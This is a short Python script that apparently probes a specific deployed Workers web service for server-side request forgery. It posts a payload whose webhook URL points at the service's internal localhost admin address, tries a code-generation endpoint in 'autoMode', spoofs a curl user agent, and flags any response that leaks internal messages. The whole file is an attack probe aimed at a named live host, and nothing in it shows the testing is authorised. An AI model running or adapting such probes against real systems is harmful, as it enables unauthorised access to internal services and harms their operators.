import json, urllib.request
BASE = "https://phoenix-coder.mrmichaelhobbs123.workers.dev"
PROBES = [
    ("/api/queue", "POST", {"task": "ssrf", "targetfile": "x.js", "webhookUrl": "http://localhost:8080/admin"}),
    ("/api/code", "POST", {"task": "hello world", "targetfile": "h.js", "autoMode": True}),
    ("/api/status","GET", None),
]
for path, method, body in PROBES:
    url = f"{BASE}{path}"
    data = json.dumps(body).encode() if body else None
    req = urllib.request.Request(
        url, data=data,
        headers={"Content-Type": "application/json", "User-Agent": "curl/7.88.1"},
        method=method
    )
    try:
        with urllib.request.urlopen(req, timeout=12) as r:
            raw = r.read()[:300].decode(errors="replace")
            print(f"OK {r.status} [{method} {path}]")
            if "localhost" in raw or "not allowed" in raw:
                print("  !! SSRF MESSAGE LEAKED:", raw[:200])
    except urllib.error.HTTPError as e:
        raw = e.read()[:200].decode(errors="replace")
        print(f"H {e.code} [{method} {path}] ", raw[:200])
    except Exception as e:
        print(f"ERR [{method} {path}]", type(e).__name__, str(e)[:200])
